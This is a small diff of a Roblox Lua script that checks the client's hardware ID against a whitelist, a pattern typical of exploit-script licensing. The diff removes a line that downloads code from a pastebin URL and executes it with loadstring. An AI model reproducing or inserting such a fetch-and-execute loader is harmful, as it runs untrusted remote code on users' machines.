@@ -6,8 +6,6 @@ local HWID = game:GetService("RbxAnalyticsService"):GetClientId();
 local WhitelistedHWIDs = {"3e1c4b4e-9faf-4909-9bfe-f02ede989c70"}
 local qNVAKkuwxNpqruLjSRHg = false
  
-loadstring(game:HttpGet("https://pastebin.com/raw/CBZ1CZ9s"))()
- 
 function CheckHWID(hwidval)
 for _,whitelisted in pairs(WhitelistedHWIDs) do
  if hwidval == whitelisted then
